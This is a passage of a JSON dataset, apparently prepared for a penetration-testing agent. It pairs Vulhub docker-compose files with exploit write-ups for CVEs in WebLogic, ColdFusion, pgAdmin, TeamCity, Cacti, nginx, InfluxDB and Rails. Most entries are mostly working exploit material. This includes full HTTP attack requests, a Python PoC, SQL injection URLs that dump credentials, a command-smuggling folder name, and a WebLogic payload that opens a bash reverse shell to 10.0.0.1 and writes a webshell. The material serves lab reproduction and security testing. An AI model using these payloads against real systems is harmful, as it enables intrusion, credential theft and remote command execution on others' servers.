processBuilderClass.getMethod(\\\"start\\\");org.apache.commons.io.IOUtils.toString(startMethod.invoke(processBuilderInstance).getInputStream());\",\n    \"bindings\": {},\n    \"language\": \"gremlin-groovy\",\n    \"aliases\": {}\n}\n```\n\nThe command will be executed successfully:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2018-3760.md",
    "filenamenomd": "CVE-2018-3760",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2018-3760/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rails/CVE-2018-3760/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 85 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/rails:5.0.7\n   ports:\n    - \"3000:3000\"\n```\n\n",
    "readme": "# Ruby On Rails Path Traversal Vulnerability（CVE-2018-3760）\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nRuby On Rails is a well-known Ruby Web development framework, which uses Sprockets as a static file server in development environment. Sprockets is a Ruby library that compiles and distributes static resource files.\n\nThere is a path traversal vulnerability caused by secondary decoding in Sprockets 3.7.1 and lower versions. An attacker can use `%252e%252e/` to access the root directory and read or execute any file on the target server.\n\nReference links：\n\n- https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf\n- https://seclists.org/oss-sec/2018/q2/210\n- https://xz.aliyun.com/t/2542\n\n## Environment setup\n\nEnter the following command：\n\n```\ndocker compose up -d\n```\n\nVisit `http://your-ip:3000` and you'll see the welcome page.\n\n## POC\n\nIt will give an error by visiting `http://your-ip:3000/assets/file:%2f%2f/etc/passwd` directly, as the file `/etc/passwd` is not in the allowed directory.\n\n![](1.png)\n\nWe can get a list of allowed directories by the error page. Just select one of them, such as `/usr/src/blog/app/assets/images`, then use `%252e%252e/` to jump to the parent directory, and finally read the file `/etc/passwd`:\n\n```\nhttp://your-ip:3000/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2023-26360.md",
    "filenamenomd": "CVE-2023-26360",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2023-26360/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2023-26360/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 191 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  coldfusion:\n    image: vulhub/coldfusion:2018.0.15\n    ports:\n      - \"8500:8500\"\n      - \"5005:5005\"\n    environment:\n      - password=vulhub\n      - acceptEULA=YES\n\n```\n\n",
    "readme": "# Adobe ColdFusion Local File Inclusion Leads to RCE (CVE-2023-26360)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.\n\nAdobe ColdFusion versions 2018 Update 15 (and earlier) and 2021 Update 5 (and earlier) are affected by an Improper Access Control vulnerability that could result in local file inclusion and arbitrary code execution in the context of the current user.\n\nReferences:\n\n- <https://xz.aliyun.com/t/13392>\n\n## Vulnerable environment\n\nStart a Adobe ColdFusion 2018.0.15:\n\n```\ndocker compose up -d\n```\n\nAfter a few minutes wait, visit `http://your-ip:8500/CFIDE/administrator/index.cfm` with password `vulhub`, you can install the Adobe ColdFusion successfully.\n\n## Exploit\n\nSimply send following request to server to download `/proc/self/environ`:\n\n```\nPOST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost:8500\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 82\nContent-Type: application/x-www-form-urlencoded\n\n_variables={\"_metadata\":{\"classname\":\"../../../../../../../../proc/self/environ\"}}\n```\n\nThen you will find the base directory `/opt/coldfusion/cfusion` of Adobe ColdFusion:\n\n![](1.png)\n\nRetrieve password by `../../../../../../../../opt/coldfusion/cfusion/lib/password.properties`:\n\n![](2.png)\n\nTo exploit the arbitrary code execution issue, first send a request to the server containing a CFM script:\n\n```\nPOST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost:8500\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 67\nContent-Type: application/x-www-form-urlencoded\n\n_variables=<cfexecute name='id' outputFile='/tmp/success' ></cfexecute>\n```\n\nThen, include the log file to execute the CFM script:\n\n```\nPOST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost:8500\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\nContent-Length: 111\nContent-Type: application/x-www-form-urlencoded\n\n_variables={\"_metadata\":{\"classname\":\"../../../../../../../../opt/coldfusion/cfusion/logs/coldfusion-out.log\"}}\n```\n\nThe `id` command is executed and output to `/tmp/success`:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-5002.md",
    "filenamenomd": "CVE-2023-5002",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/pgadmin/CVE-2023-5002/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/pgadmin/CVE-2023-5002/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/pgadmin:7.6\n   ports:\n    - \"5050:5050\"\n\n```\n\n",
    "readme": "# pgAdmin <= 7.6 Authenticated Remote Command Execution (CVE-2023-5002)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\npgAdmin is a popular and feature rich Open Source administration and development platform for PostgreSQL, the most advanced Open Source database in the world.\n\nA flaw was found in pgAdmin. This issue occurs when the pgAdmin server HTTP API validates the path a user selects to external PostgreSQL utilities such as pg_dump and pg_restore. Versions of pgAdmin prior to 7.7 failed to properly control the server code executed on this API, allowing an authenticated user to run arbitrary commands on the server.\n\nReferences:\n\n- <https://github.com/pgadmin-org/pgadmin4/commit/35f05e49b3632a0a674b9b36535a7fe2d93dd0c2>\n- <https://github.com/advisories/GHSA-ghp8-52vx-77j4>\n\n## Vulnerable Environment\n\nExecute following command to start a pgAdmin 7.6 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse the `http://your-ip:5050` to see the default login page of pgAdmin.\n\n### Something we should know before exploiting the issue\n\nCVE-2023-5002 is a pathes bypass for previous issue [CVE-2022-4223](https://github.com/vulhub/vulhub/tree/master/pgadmin/CVE-2022-4223). There are 2 updates from official patches:\n\n- Added `@login_required` to `validate_binary_path` function, not allowed unauthenticated user to access this API\n- Added `os.path.exists()` to check if the user provided parameter is a valid path\n\nUnfortunately, we can only bypass the second patch, so the CVE-2023-5002 is a authenticated vulerability.\n\n## Exploit\n\nLogin the pgAdmin by username `vulhub@example.com` and password `vulhub`.\n\nSelect \"Tools -> Storage Manager\" to open the filemanager dialog:\n\n![](1.png)\n\nCreate a new folder which name is a crafted payload `\";id;#`:\n\n![](2.png)\n\nFull path of this folder is `/var/lib/pgadmin/storage/vulhub_example.com/\";id;#`, we will use this path to complete the exploitation.\n\nGo to \"File -> Preferences\" to open the setting dialog, open the \"Paths -> Binary paths\" panel.\n\nFill the `/var/lib/pgadmin/storage/vulhub_example.com/\";id;#` into any field of \"PostgreSQL Binary Path\" then click validate:\n\n![](3.png)\n\nAs you can see, the `id` command is executed successful:\n\n![](4.png)\n"
  },
  {
    "filename": "CVE-2017-10271.md",
    "filenamenomd": "CVE-2017-10271",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2017-10271/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/weblogic/CVE-2017-10271/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n weblogic:\n   image: vulhub/weblogic:10.3.6.0-2017\n   ports:\n    - \"7001:7001\"\n\n```\n\n",
    "readme": "# Weblogic < 10.3.6 'wls-wsat' XMLDecoder Deserialization Remote Command Execution (CVE-2017-10271)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOracle Weblogic Server is a popular enterprise application server that provides a wide range of features for building and deploying enterprise applications.\n\nThe WLS Security component of Weblogic provides webservice services, which uses XMLDecoder to parse XML data submitted by users. During the parsing process, a deserialization vulnerability occurs, allowing arbitrary command execution.\n\nReference links:\n\n- https://www.exploit-db.com/exploits/43458/\n- https://paper.seebug.org/487/\n- https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices组件反序列化漏洞分析.md\n- http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html\n\n## Environment Setup\n\nStart a vulnerable Weblogic server 10.3.6.0-2017:\n\n```\ndocker compose up -d\n```\n\nWait for a while, visit `http://your-ip:7001/` and you will see a 404 page, indicating that weblogic has started successfully.\n\n## Vulnerability Reproduce\n\nSend the following request (note that the reverse shell command needs to be encoded, otherwise XML parsing will result in format errors):\n\n```\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: your-ip:7001\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: text/xml\nContent-Length: 633\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header>\n<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n<java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n<void class=\"java.lang.ProcessBuilder\">\n<array class=\"java.lang.String\" length=\"3\">\n<void index=\"0\">\n<string>/bin/bash</string>\n</void>\n<void index=\"1\">\n<string>-c</string>\n</void>\n<void index=\"2\">\n<string>bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1</string>\n</void>\n</array>\n<void method=\"start\"/></void>\n</java>\n</work:WorkContext>\n</soapenv:Header>\n<soapenv:Body/>\n</soapenv:Envelope>\n```\n\nSuccessfully obtained shell:\n\n![](1.png)\n\nWrite webshell (access: `http://your-ip:7001/bea_wls_internal/test.jsp`):\n\n```\nPOST /wls-wsat/CoordinatorPortType HTTP/1.1\nHost: your-ip:7001\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: text/xml\nContent-Length: 638\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">\n    <soapenv:Header>\n    <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n    <java><java version=\"1.4.0\" class=\"java.beans.XMLDecoder\">\n    <object class=\"java.io.PrintWriter\"> \n    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>\n    <void method=\"println\"><string>\n    <![CDATA[\n<% out.print(\"test\"); %>\n    ]]>\n    </string>\n    </void>\n    <void method=\"close\"/>\n    </object></java></java>\n    </work:WorkContext>\n    </soapenv:Header>\n    <soapenv:Body/>\n</soapenv:Envelope>\n```\n"
  },
  {
    "filename": "CVE-2017-7529.md",
    "filenamenomd": "CVE-2017-7529",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/default.conf\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/default.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 579 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\nproxy_cache_path /tmp/nginx levels=1:2 keys_zone=cache_zone:10m;\nproxy_cache_valid 200 10m;\n\nserver {\n    listen       8081;\n    server_name  localhost;\n\n    charset utf-8;\n\n    location / {\n        root   /usr/share/nginx/html;\n        index  index.html;\n    }\n}\nserver {\n    listen       8080;\n    server_name  localhost;\n\n    charset utf-8;\n\n    location / {\n        proxy_pass http://127.0.0.1:8081/;\n        proxy_set_header HOST $host;\n        proxy_cache cache_zone;\n        add_header X-Proxy-Cache $upstream_cache_status;\n        proxy_ignore_headers Set-Cookie;\n    }\n}\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 575 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python\nimport sys\nimport requests\n\nif len(sys.argv) < 2:\n    print(\"%s url\" % (sys.argv[0]))\n    print(\"eg: python %s http://your-ip:8080/\" % (sys.argv[0]))\n    sys.exit()\n\nheaders = {\n    'User-Agent': \"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240\"\n}\noffset = 605\nurl = sys.argv[1]\nfile_len = len(requests.get(url, headers=headers).content)\nn = file_len + offset\nheaders['Range'] = \"bytes=-%d,-%d\" % (\n    n, 0x8000000000000000 - n)\n\nr = requests.get(url, headers=headers)\nprint(r.text)\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2017-7529/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 139 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n nginx:\n   image: vulhub/nginx:1.13.2\n   volumes:\n    - ./default.conf:/etc/nginx/conf.d/default.conf\n   ports:\n    - \"8080:8080\"\n```\n\n",
    "readme": "# Nginx Cache Leak by Integer Overflow (CVE-2017-7529)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. When Nginx acts as a reverse proxy, it typically caches certain files, especially static files. The cached content is stored in files, with each cache file containing a \"file header\" + \"HTTP response header\" + \"HTTP response body\". If a subsequent request hits this cache file, Nginx will directly return the \"HTTP response body\" from the file to the user.\n\nNginx versions since 0.5.6 up to and including 1.13.2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.\n\nIf a request contains a Range header, Nginx will return content of specified length based on the start and end positions provided. However, if we construct two negative positions, such as (-600, -9223372036854774591), it becomes possible to read data from negative positions. If this request hits a cache file, we may be able to read the \"file header\" and \"HTTP response header\" that are located before the \"HTTP response body\" in the cache file.\n\nReferences:\n\n - https://cert.360.cn/detailnews.html?id=b879782fbad4a7f773b6c18490d67ac7\n - http://galaxylab.org/cve-2017-7529-nginx%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/\n\n## Environment Setup\n\nRun the following command to start a Nginx server version 1.13.2:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080/` to see the Nginx default page, which is actually content reverse proxied from port 8081.\n\n## Vulnerability Reproduce\n\nRun `python3 poc.py http://your-ip:8080/` and check the returned results:\n\n![](01.png)\n\nAs you can see, we've successfully read the \"file header\" and \"HTTP response header\" content located before the \"HTTP response body\" through out-of-bounds reading.\n\nIf the reading is incorrect, try adjusting the offset address (605) in poc.py.\n"
  },
  {
    "filename": "CVE-2023-42793.md",
    "filenamenomd": "CVE-2023-42793",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/teamcity/CVE-2023-42793/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/teamcity/CVE-2023-42793/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 223 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/teamcity:2023.05.3\n   ports:\n    - \"8111:8111\"\n    - \"5005:5005\"\n   environment:\n    - TEAMCITY_SERVER_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005\n\n```\n\n",
    "readme": "# Jetbrains TeamCity Authentication Bypass and Remote Command Execution (CVE-2023-42793)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nTeamCity is a general-purpose CI/CD software platform that allows for flexible workflows, collaboration and development practices.\n\nTeamCity server version 2023.05.3 and below is prone to an authentication bypass, which allows an unauthenticated attacker to gain remote code execution (RCE) on the server.\n\nReferences:\n\n- <https://www.sonarsource.com/blog/teamcity-vulnerability/>\n- <https://blog.projectdiscovery.io/cve-2023-42793-vulnerability-in-jetbrains-teamcity/>\n\n## Vulnerable Environment\n\nExecute following command to start a TeamCity server 2023.05.3:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you should do the initialization steps on `http://localhost:8111`:\n\n![](1.png)\n\n## Exploit\n\nThe key point of this issue is that, all the requests end with `/RPC2` wouldn't be authenticated.\n\nTo exploit the issue, send the following request to add a rest API token that name is `RPC2`:\n\n```\nPOST /app/rest/users/id:1/tokens/RPC2 HTTP/1.1\nHost: localhost:8111\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n\n![](2.png)\n\nSuccess to generate a rest API token. Then, enable the debug mode with the API token:\n\n```\nPOST /admin/dataDir.html?action=edit&fileName=config%2Finternal.properties&content=rest.debug.processes.enable=true HTTP/1.1\nHost: localhost:8111\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\nAuthorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0\n\n\n```\n\n![](3.png)\n\nYou are able to execute arbitrary commands after the debug mode is enabled:\n\n```\nPOST /app/rest/debug/processes?exePath=id HTTP/1.1\nHost: localhost:8111\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Length: 0\nAuthorization: Bearer eyJ0eXAiOiAiVENWMiJ9.UTlaUm5sYzQtRUZ0YTNhT1llU2xpTU43TjNF.MWY2NjI4MmQtYzFlMi00YTEwLTk1ZTEtMDFiZmZiOGY2NGY0\n\n\n```\n\n![](4.png)\n\nIt's better to delete the API token that we added before:\n\n```\nDELETE /app/rest/users/id:1/tokens/RPC2 HTTP/1.1\nHost: localhost:8111\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n"
  },
  {
    "filename": "CVE-2023-39361.md",
    "filenamenomd": "CVE-2023-39361",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2023-39361/entrypoint.sh\n- /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2023-39361/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2023-39361/entrypoint.sh\n\n- Extension: .sh\n- Language: bash\n- Size: 607 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```bash\n#!/bin/bash\nset -ex\n\nwait-for-it db:3306 -t 300 -- echo \"database is connected\"\nif [[ ! $(mysql --host=db --user=root --password=root cacti -e \"show tables\") =~ \"automation_devices\" ]]; then\n    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql\n    mysql --host=db --user=root --password=root cacti -e \"UPDATE user_auth SET must_change_password='' WHERE username = 'admin'\"\n    mysql --host=db --user=root --password=root cacti -e \"SET GLOBAL time_zone = 'UTC'\"\nfi\n\n# first arg is `-f` or `--some-option`\nif [ \"${1#-}\" != \"$1\" ]; then\n\tset -- apache2-foreground \"$@\"\nfi\n\nexec \"$@\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/cacti/CVE-2023-39361/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 444 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/cacti:1.2.24\n    ports:\n     - \"8080:80\"\n    depends_on:\n     - db\n    entrypoint:\n     - bash\n     - /entrypoint.sh\n    volumes:\n     - ./entrypoint.sh:/entrypoint.sh\n    command: apache2-foreground\n  db:\n   image: mysql:5.7\n   environment:\n    - MYSQL_ROOT_PASSWORD=root\n    - MYSQL_DATABASE=cacti\n   command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci\n   ports:\n    - \"3306:3306\"\n\n```\n\n",
    "readme": "# Cacti graph_view.php SQL Injection Leads to RCE (CVE-2023-39361/CVE-2024-31459)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nCacti is a complete network graphing solution designed to harness the power of RRDTool's data storage and graphing functionality, providing network managers with an intuitive interface to network data.\n\nIn Cacti versions 1.2.24 and earlier, a critical vulnerability exists in graph_view.php that allows guest users to perform SQL injection via the 'rfilter' parameter. When guest access is enabled, attackers can potentially cause significant damage, including remote code execution.\n\nReferences:\n\n- <https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg>\n- <https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv>\n\n## Environment Setup\n\nExecute the following command to start a Cacti 1.2.24 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, you can access the Cacti interface at `http://your-ip:8080`. The default credentials are admin/admin.\n\nLog in as admin and follow the initialization instructions. Simply click the \"Next\" button repeatedly until you see the success page.\n\nBefore exploiting the vulnerability without authentication, you must enable guest access. Log in as admin, navigate to `Configuration -> Authentication`, and enable the guest user:\n\n![](1.png)\n\n## Vulnerability Reproduction\n\nThe vulnerability exists in the `grow_right_pane_tree` function in `graph_view.php`. When the 'action' parameter is set to 'tree_content', the user input ('rfilter' parameter) is validated through the `html_validate_tree_vars` function, but this validation only ensures that the input is a valid regular expression and doesn't prevent SQL injection.\n\nThe SQL injection occurs because the rfilter parameter is directly inserted into a SQL query with double quotes, allowing attackers to escape the query context and inject malicious SQL code.\n\nTo exploit this vulnerability, send a request to the graph_view.php endpoint with the following parameters:\n\n```\nhttp://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaaaa\"%20OR%20\"\"=\"((\"))%20UNION%20SELECT%201,2,(select%20concat(id,0x23,username,0x23,password)%20from%20user_auth%20limit%201),4,5,6,(select%20user()),(select%20version()),9,10%23\n```\n\nThe output reveals database information and admin account password:\n\n![](2.png)\n\nSince Cacti supports stacked queries, you can leverage this vulnerability along with [CVE-2024-31459](https://github.com/Cacti/cacti/security/advisories/GHSA-cx8g-hvq8-p2rv) to achieve local file inclusion.\n\nFirst, add a new plugin hook that points to the `log/cacti.log` file:\n\n```\nhttp://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa\"%20OR%20\"\"=\"((\"));INSERT%20INTO%20plugin_hooks(name,hook,file,status)%20VALUES%20(\".\",\"login_before\",\"../log/cacti.log\",1);%23\n```\n\nThen, write PHP code to the `log/cacti.log` file using an error-based SQL injection:\n\n```\nhttp://your-ip:8080/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa\"%20OR%20\"\"=\"((\"))%20UNION%20SELECT%201,2,3,4,5,6,updatexml(rand(),concat(0x7e,\"<?php%20phpinfo();?>\",0x7e),null),8,9,10%23\n```\n\nNow, the PHPINFO function will execute and display when accessing the login page, confirming successful remote code execution:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2019-20933.md",
    "filenamenomd": "CVE-2019-20933",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/influxdb/CVE-2019-20933/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/influxdb/CVE-2019-20933/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 236 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/influxdb:1.6.6\n   environment: \n    - INFLUXDB_HTTP_AUTH_ENABLED=true\n    - INFLUXDB_ADMIN_USER=admin\n    - INFLUXDB_ADMIN_PASSWORD=admin\n    - INFLUXDB_DB=sample\n   ports:\n    - \"8086:8086\"\n```\n\n",
    "readme": "# InfluxDB Empty JWT Secret Key Authentication Bypass (CVE-2019-20933)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nInfluxDB is an open-source time series database developed by the company InfluxData.\n\nInfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in `services/httpd/handler.go` because a JWT token may have an empty SharedSecret (aka shared secret).\n\nReferences:\n\n- https://www.komodosec.com/post/when-all-else-fails-find-a-0-day\n- https://github.com/influxdata/influxdb/issues/12927\n- https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933\n- https://docs.influxdata.com/influxdb/v1.7/administration/config/#http-endpoints-settings\n\n## Vulnerable Environment\n\nExecute following command to start a InfluxDB 1.6.6:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, you can see some debug information in `http://your-ip:8086/debug/vars`. But you are unable to execute SQL statement without authencation and a 401 error is responsed:\n\n![](1.png)\n\n## Vulnerability Reproduce\n\nWe can use <https://jwt.io/> to generate a valid JWT token with an empty secret key:\n\n```\n{\n  \"alg\": \"HS256\",\n  \"typ\": \"JWT\"\n}\n{\n  \"username\": \"admin\",\n  \"exp\": 2986346267\n}\n```\n\nWhere `username` is the administrator account name, and `exp` is the token expiration time. You should set `exp` to a future time to make it effect:\n\n![](2.png)\n\nThen take this token to the request, and success to execute SQL statement `show users` in the server:\n\n```\nPOST /query HTTP/1.1\nHost: your-ip\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 22\n\ndb=sample&q=show+users\n```\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-22527.md",
    "filenamenomd": "CVE-2023-22527",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2023-22527/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2023-22527/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 241 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/confluence:8.5.3\n    ports:\n      - \"8090:8090\"\n    depends_on:\n      - db\n  db:\n    image: postgres:15.4-alpine\n    environment: \n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=confluence\n\n```\n\n",
